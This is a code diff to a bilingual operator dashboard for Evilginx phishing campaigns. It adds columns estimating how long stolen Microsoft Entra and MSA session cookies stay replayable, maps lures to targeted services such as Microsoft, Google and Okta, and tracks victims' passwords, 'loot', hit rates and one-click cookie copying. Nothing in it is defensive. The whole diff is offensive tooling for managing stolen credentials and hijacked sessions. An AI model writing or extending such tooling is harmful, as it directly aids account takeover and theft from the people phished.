@@ -313,15 +313,21 @@ const I18N = {
     tab_dash:"Dashboard", tab_victims:"Accounts", tab_sessions:"Captures", tab_lures:"Lures", tab_urls:"URLs", tab_settings:"Settings",
     domains:"Hosts", all_phishlets:"All phishlets", only_valid:"Replayable only", show_noise:"Include visits with no login",
     th_user:"Account", th_phishlet:"Phishlet", th_loot:"Loot", th_cookies:"Cookies", th_attempts:"Hits",
-    th_lastip:"IP", th_seen:"Seen", th_pass:"Password", th_captured:"Captured",
+    th_lastip:"IP", th_seen:"Seen", th_pass:"Password", th_captured:"Captured", th_expires:"Expires",
+    th_target:"Target", th_lure_id:"Lure",
     kind_msa:"MSA", kind_entra:"Entra", kind_none:"—", persist:"persist", used:"used",
     of:"of", victims_l:"accounts", sessions_l:"captures", empty_victims:"Nothing matches.",
     empty_sessions:"Nothing matches.", empty_insp:"Select a row. c copies cookies of the selection.",
     best_session:"Best capture", cookies_w:"cookies", useragent:"User-Agent", landing:"Landing",
     attempts_h:"Captures", mark_used:"Used", notes_ph:"notes (replayed, MFA, bounced…)", save:"Save notes",
     loading:"loading…", copy_cookies:"Copy cookies", view_json:"JSON", view_cookies:"Cookie names",
-    lure_col:"Lure", visits_col:"Visits", valid_col:"Replayable", victims_col:"Accounts", conv_col:"Hit rate",
+    lure_col:"URL", visits_col:"Visits", valid_col:"Replayable", victims_col:"Accounts", conv_col:"Hit rate",
     no_lures:"No lure data yet.", unknown:"(unknown)",
+    ttl_session:"browser session", ttl_expired:"expired", ttl_est:"est.",
+    ttl_typical:"Typical lifetime — Evilginx does not store Max-Age. Entra persistent ≈ 90d, MSA persistent ≈ 1y. Tenant policy can cut this short.",
+    ttl_session_t:"Cookie dies when the victim closes the browser.",
+    ttl_days:n=>n+'d left', ttl_hours:n=>n+'h left', ttl_mins:n=>n+'m left',
+    expires_k:"Expires",
     url_ph:"https://login.your-domain.com/xxxx", label_ph:"label", add:"Add", active_only:"Up only",
     copy_active:"Copy live", active:"up", down:"down", copy:"Copy", delete:"Remove",
     url_empty_active:"No live URLs.", url_empty:"Paste a lure URL above.",
@@ -362,15 +368,21 @@ const I18N = {
     tab_dash:"Dashboard", tab_victims:"Cuentas", tab_sessions:"Capturas", tab_lures:"Lures", tab_urls:"URLs", tab_settings:"Ajustes",
     domains:"Hosts", all_phishlets:"Todos los phishlets", only_valid:"Solo rejugables", show_noise:"Incluir visitas sin login",
     th_user:"Cuenta", th_phishlet:"Phishlet", th_loot:"Loot", th_cookies:"Cookies", th_attempts:"Hits",
-    th_lastip:"IP", th_seen:"Visto", th_pass:"Password", th_captured:"Capturado",
+    th_lastip:"IP", th_seen:"Visto", th_pass:"Password", th_captured:"Capturado", th_expires:"Caduca",
+    th_target:"Servicio", th_lure_id:"Lure",
     kind_msa:"MSA", kind_entra:"Entra", kind_none:"—", persist:"persist", used:"usada",
     of:"de", victims_l:"cuentas", sessions_l:"capturas", empty_victims:"Nada coincide.",
     empty_sessions:"Nada coincide.", empty_insp:"Selecciona una fila. c copia las cookies.",
     best_session:"Mejor captura", cookies_w:"cookies", useragent:"User-Agent", landing:"Landing",
     attempts_h:"Capturas", mark_used:"Usada", notes_ph:"notas (rejugada, MFA, rebotó…)", save:"Guardar notas",
     loading:"cargando…", copy_cookies:"Copiar cookies", view_json:"JSON", view_cookies:"Nombres",
-    lure_col:"Lure", visits_col:"Visitas", valid_col:"Rejugables", victims_col:"Cuentas", conv_col:"Conversión",
+    lure_col:"URL", visits_col:"Visitas", valid_col:"Rejugables", victims_col:"Cuentas", conv_col:"Conversión",
     no_lures:"Sin lures todavía.", unknown:"(desconocido)",
+    ttl_session:"sesión (navegador)", ttl_expired:"caducada", ttl_est:"est.",
+    ttl_typical:"Vida típica — Evilginx no guarda el Max-Age. Entra persistente ≈ 90d, MSA persistente ≈ 1 año. El tenant puede acortarlo.",
+    ttl_session_t:"La cookie muere cuando la víctima cierra el navegador.",
+    ttl_days:n=>n+'d restantes', ttl_hours:n=>n+'h restantes', ttl_mins:n=>n+'m restantes',
+    expires_k:"Caduca",
     url_ph:"https://login.tu-dominio.com/xxxx", label_ph:"etiqueta", add:"Añadir", active_only:"Solo arriba",
     copy_active:"Copiar vivas", active:"arriba", down:"caída", copy:"Copiar", delete:"Quitar",
     url_empty_active:"Ninguna URL arriba.", url_empty:"Pega un lure arriba.",
@@ -443,6 +455,60 @@ function kindCell(s) {
   const k = kindLabel(s);
   const persist = s && s.persistent ? `<span class="persist">${t('persist')}</span>` : '';
   return `<span class="kind ${k.cls}">${k.text}</span>${persist}`;
+}
+function ttlLabel(secs) {
+  if (secs >= 86400) return t('ttl_days')(Math.floor(secs / 86400));
+  if (secs >= 3600) return t('ttl_hours')(Math.floor(secs / 3600));
+  return t('ttl_mins')(Math.max(1, Math.floor(secs / 60)));
+}
+function ttlCell(s) {
+  if (!s || !s.valid) return '<span class="mut">—</span>';
+  if (s.ttl_kind === 'session' || (!s.expires && s.ttl_kind !== 'parsed')) {
+    if (s.ttl_kind === 'unknown') return '<span class="mut">—</span>';
+    return `<span class="mut" title="${t('ttl_session_t')}">${t('ttl_session')}</span>`;
+  }
+  if (!s.expires) return '<span class="mut">—</span>';
+  const left = s.expires - Date.now() / 1000;
+  const when = absTime(s.expires);
+  const tip = when + (s.ttl_kind === 'typical' ? ' · ' + t('ttl_typical') : '');
+  if (left <= 0) return `<span title="${esc(tip)}">${t('ttl_expired')}</span>`;
+  const est = s.ttl_kind === 'typical' ? ` <span class="mut">${t('ttl_est')}</span>` : '';
+  return `<span class="num" title="${esc(tip)}">${ttlLabel(left)}${est}</span>`;
+}
+function serviceOf(s) {
+  if (s.kind === 'entra') return 'Microsoft Entra';
+  if (s.kind === 'msa') return 'Microsoft MSA';
+  const blob = ((s.phishlet || '') + ' ' + (s.landing || '')).toLowerCase();
+  if (/microsoft|o365|office365|office|entra|azure|msa\b|live\.com|microsoftonline/.test(blob)) return 'Microsoft';
+  if (/google|gmail|gworkspace|workspace|accounts\.google/.test(blob)) return 'Google';
+  if (/okta/.test(blob)) return 'Okta';
+  if (/github/.test(blob)) return 'GitHub';
+  if (/linkedin/.test(blob)) return 'LinkedIn';
+  if (/facebook|meta/.test(blob)) return 'Facebook';
+  if (/apple|icloud/.test(blob)) return 'Apple';
+  if (/amazon|aws/.test(blob)) return 'Amazon';
+  if (/onelogin/.test(blob)) return 'OneLogin';
+  if (/twitter|\bx\.com/.test(blob)) return 'X';
+  if (s.phishlet && s.phishlet !== 'example') return s.phishlet;
+  return t('unknown');
+}
+function lureId(url) {
+  try {
+    const u = new URL(url);
+    const parts = u.pathname.split('/').filter(Boolean);
+    return parts.length ? parts[parts.length - 1] : u.host;
+  } catch (e) { return url || ''; }
+}
+function lureTarget(sessions) {
+  const kinds = new Set(sessions.map(s => s.kind).filter(Boolean));
+  const phls = [...new Set(sessions.map(s => s.phishlet).filter(Boolean))];
+  let name = [...new Set(sessions.map(serviceOf))][0] || phls[0] || t('unknown');
+  if (kinds.has('entra') && kinds.has('msa')) name = 'Microsoft';
+  else if (kinds.has('entra')) name = 'Microsoft Entra';
+  else if (kinds.has('msa')) name = 'Microsoft MSA';
+  let detail = phls.join(', ');
+  if (kinds.has('entra') && kinds.has('msa')) detail = 'Entra + MSA' + (phls.length ? ' · ' + phls.join(', ') : '');
+  return { name, detail };
 }
 
 function applyStatic() {
@@ -695,19 +761,23 @@ function renderLures() {
   const m = new Map();
   for (const s of (state.raw || [])) {
     const u = s.landing || t('unknown');
-    let e = m.get(u); if (!e) { e = { url: u, visits: 0, valid: 0, users: new Set() }; m.set(u, e); }
-    e.visits++; if (s.valid) e.valid++; if (s.username) e.users.add(s.username.toLowerCase());
+    let e = m.get(u); if (!e) { e = { url: u, visits: 0, valid: 0, users: new Set(), sessions: [] }; m.set(u, e); }
+    e.visits++; e.sessions.push(s); if (s.valid) e.valid++; if (s.username) e.users.add(s.username.toLowerCase());
   }
   const rows = [...m.values()].sort((a, b) => b.valid - a.valid || b.visits - a.visits);
   $('#luresview').innerHTML =
     `<table><thead><tr>
-       <th>${t('lure_col')}</th><th>${t('visits_col')}</th><th>${t('valid_col')}</th><th>${t('victims_col')}</th><th>${t('conv_col')}</th>
+       <th>${t('th_target')}</th><th>${t('th_lure_id')}</th><th>${t('lure_col')}</th><th>${t('visits_col')}</th><th>${t('valid_col')}</th><th>${t('victims_col')}</th><th>${t('conv_col')}</th>
      </tr></thead><tbody>` +
     (rows.length ? rows.map(e => {
       const conv = e.visits ? Math.round(e.valid / e.visits * 100) : 0;
-      return `<tr><td class="num" style="color:var(--copper);word-break:break-all">${esc(e.url)}</td>
+      const tgt = lureTarget(e.sessions);
+      return `<tr>
+        <td><div class="u">${esc(tgt.name)}</div>${tgt.detail ? `<div class="mut">${esc(tgt.detail)}</div>` : ''}</td>
+        <td class="num" style="color:var(--copper)">${esc(lureId(e.url))}</td>
+        <td class="mut" style="font-family:var(--mono);font-size:12px;word-break:break-all">${esc(e.url)}</td>
         <td class="num">${e.visits}</td><td class="num">${e.valid}</td><td class="num">${e.users.size}</td><td class="num">${conv}%</td></tr>`;
-    }).join('') : `<tr><td colspan="5" class="empty">${t('no_lures')}</td></tr>`) + `</tbody></table>`;
+    }).join('') : `<tr><td colspan="7" class="empty">${t('no_lures')}</td></tr>`) + `</tbody></table>`;
 }
 
 async function loadVState() { try { window._vstate = await (await fetch('/api/vstate')).json() || {}; } catch (e) { window._vstate = {}; } }
@@ -732,12 +802,12 @@ function th(cols) {
 function renderVictims() {
   const all = victims();
   const filtered = applyFilter(all, v => v.username, v => v.phishlets);
-  const getters = { user: v => v.username, pass: v => v.password || '', phishlet: v => v.phishlets.join(','), valid: v => v.valid ? 1 : 0, cookies: v => v.cookies, attempts: v => v.sessions.length, update: v => v.lastUpdate };
+  const getters = { user: v => v.username, pass: v => v.password || '', phishlet: v => v.phishlets.join(','), valid: v => v.valid ? 1 : 0, expires: v => v.best && v.best.expires || 0, cookies: v => v.cookies, attempts: v => v.sessions.length, update: v => v.lastUpdate };
   const rows = sortList(filtered, getters);
   state.rows = rows.map(v => ({ type: 'victim', key: v.username.toLowerCase(), data: v }));
   $('#thead').innerHTML = th([
     ['user', t('th_user'), true], ['pass', t('th_pass'), true], ['phishlet', t('th_phishlet'), true], ['valid', t('th_loot'), true],
-    ['cookies', t('th_cookies'), true], ['attempts', t('th_attempts'), true], ['', t('th_lastip'), false], ['update', t('th_seen'), true]
+    ['expires', t('th_expires'), true], ['cookies', t('th_cookies'), true], ['attempts', t('th_attempts'), true], ['', t('th_lastip'), false], ['update', t('th_seen'), true]
   ]);
   $('#tbody').innerHTML = rows.length ? rows.map(v => {
     const vst = (window._vstate || {})[v.username.toLowerCase()] || {};
@@ -748,12 +818,13 @@ function renderVictims() {
       <td>${passCell(v.password, 'v:' + v.username.toLowerCase())}</td>
       <td class="phl">${v.phishlets.map(esc).join(', ')}</td>
       <td>${kindCell(v.best)}${vst.used ? `<span class="mark">${t('used')}</span>` : ''}${ips.size > 1 ? `<span class="mark" title="${t('mip_title')(ips.size)}">${ips.size} IPs</span>` : ''}</td>
+      <td>${ttlCell(v.best)}</td>
       <td class="num">${v.cookies}</td>
       <td class="num">${v.sessions.length}</td>
       <td class="mut">${esc(v.lastIP)}</td>
       <td class="mut" title="${absTime(v.lastUpdate)}">${relTime(v.lastUpdate)}</td>
     </tr>`;
-  }).join('') : `<tr><td colspan="8" class="empty">${t('empty_victims')}</td></tr>`;
+  }).join('') : `<tr><td colspan="9" class="empty">${t('empty_victims')}</td></tr>`;
   $('#count').textContent = `${rows.length} ${t('of')} ${all.length} ${t('victims_l')}`;
   if (!state.sel && rows[0]) state.sel = { type: 'victim', key: rows[0].username.toLowerCase() };
 }
@@ -762,12 +833,12 @@ function renderSessions() {
   let all = state.raw.slice();
   if (!state.showNoise) all = all.filter(s => (s.username || '').trim());
   const filtered = applyFilter(all, s => s.username, s => s.phishlet);
-  const getters = { id: s => s.id, phishlet: s => s.phishlet, user: s => s.username || '', pass: s => s.password || '', valid: s => s.valid ? 1 : 0, cookies: s => s.cookies, update: s => s.update };
+  const getters = { id: s => s.id, phishlet: s => s.phishlet, user: s => s.username || '', pass: s => s.password || '', valid: s => s.valid ? 1 : 0, expires: s => s.expires || 0, cookies: s => s.cookies, update: s => s.update };
   const rows = sortList(filtered, getters);
   state.rows = rows.map(s => ({ type: 'session', key: String(s.id), data: s }));
   $('#thead').innerHTML = th([
     ['id', '#', true], ['phishlet', t('th_phishlet'), true], ['user', t('th_user'), true], ['pass', t('th_pass'), true],
-    ['valid', t('th_loot'), true], ['cookies', t('th_cookies'), true], ['', t('th_lastip'), false], ['update', t('th_captured'), true]
+    ['valid', t('th_loot'), true], ['expires', t('th_expires'), true], ['cookies', t('th_cookies'), true], ['', t('th_lastip'), false], ['update', t('th_captured'), true]
   ]);
   $('#tbody').innerHTML = rows.length ? rows.map(s => {
     const sel = state.sel && state.sel.type === 'session' && state.sel.key === String(s.id);
@@ -777,11 +848,12 @@ function renderSessions() {
       <td>${esc(s.username) || '<span class="mut">—</span>'}</td>
       <td>${passCell(s.password, 's:' + s.id)}</td>
       <td>${kindCell(s)}</td>
+      <td>${ttlCell(s)}</td>
       <td class="num">${s.cookies}</td>
       <td class="mut">${esc(s.remote_addr)}</td>
       <td class="mut" title="${absTime(s.update)}">${relTime(s.update)}</td>
     </tr>`;
-  }).join('') : `<tr><td colspan="8" class="empty">${t('empty_sessions')}</td></tr>`;
+  }).join('') : `<tr><td colspan="9" class="empty">${t('empty_sessions')}</td></tr>`;
   $('#count').textContent = `${rows.length} ${t('of')} ${all.length} ${t('sessions_l')}`;
   if (!state.sel && rows[0]) state.sel = { type: 'session', key: String(rows[0].id) };
 }
@@ -801,7 +873,7 @@ function renderInspector() {
     const ips = [...new Set(v.sessions.map(s => s.remote_addr).filter(Boolean))];
     box.innerHTML = `
       <h2>${esc(v.username)}</h2>
-      <p class="sub">${kindCell(b)} · ${b ? b.cookies : 0} ${t('cookies_w')} · ${v.phishlets.map(esc).join(', ')}</p>
+      <p class="sub">${kindCell(b)} · ${ttlCell(b)} · ${b ? b.cookies : 0} ${t('cookies_w')} · ${v.phishlets.map(esc).join(', ')}</p>
       <div class="insp-actions">
         ${b && b.cookies ? `<button class="btn primary" data-copy="${b.id}">${t('copy_cookies')}</button>
           <button class="btn" data-view="${b.id}">${t('view_json')}</button>
@@ -810,6 +882,7 @@ function renderInspector() {
       </div>
       <div class="meta-grid">
         <div><div class="k">${t('best_session')}</div><div class="v">#${b ? b.id : '—'} · ${b && b.token ? esc(b.token) : t('kind_none')}</div></div>
+        <div><div class="k">${t('expires_k')}</div><div class="v">${ttlCell(b)}${b && b.expires ? ' · ' + absTime(b.expires) : ''}</div></div>
         <div><div class="k">${t('tokens')}</div><div class="v">${(b && b.tokens && b.tokens.length) ? b.tokens.map(esc).join(', ') : '—'}</div></div>
         <div><div class="k">${t('useragent')}</div><div class="v">${esc(b && b.useragent)}</div></div>
         <div><div class="k">${t('landing')}</div><div class="v">${esc(b && b.landing)}</div></div>
@@ -820,6 +893,7 @@ function renderInspector() {
           <span class="mut">#${s.id}</span>
           <span class="phl">${esc(s.phishlet)}</span>
           ${kindCell(s)}
+          ${ttlCell(s)}
           <span class="num">${s.cookies}</span>
           <span class="mut">${esc(s.remote_addr)}</span>
           <span class="mut" title="${absTime(s.update)}">${relTime(s.update)}</span>
@@ -845,7 +919,7 @@ function renderInspector() {
   const s = row.data;
   box.innerHTML = `
     <h2>${esc(s.username) || '#' + s.id}</h2>
-    <p class="sub">#${s.id} · ${esc(s.phishlet)} · ${kindCell(s)} · ${s.token ? esc(s.token) : t('kind_none')}</p>
+    <p class="sub">#${s.id} · ${esc(s.phishlet)} · ${kindCell(s)} · ${ttlCell(s)} · ${s.token ? esc(s.token) : t('kind_none')}</p>
     <div class="insp-actions">
       ${s.cookies ? `<button class="btn primary" data-copy="${s.id}">${t('copy_cookies')}</button>
         <button class="btn" data-view="${s.id}">${t('view_json')}</button>
@@ -854,6 +928,7 @@ function renderInspector() {
     </div>
     <div class="meta-grid">
       <div><div class="k">${t('tokens')}</div><div class="v">${(s.tokens && s.tokens.length) ? s.tokens.map(esc).join(', ') : '—'}</div></div>
+      <div><div class="k">${t('expires_k')}</div><div class="v">${ttlCell(s)}${s.expires ? ' · ' + absTime(s.expires) : ''}</div></div>
       <div><div class="k">${t('password')}</div><div class="v">${passCell(s.password, 's:' + s.id)}</div></div>
       <div><div class="k">${t('useragent')}</div><div class="v">${esc(s.useragent)}</div></div>
       <div><div class="k">${t('landing')}</div><div class="v">${esc(s.landing)}</div></div>
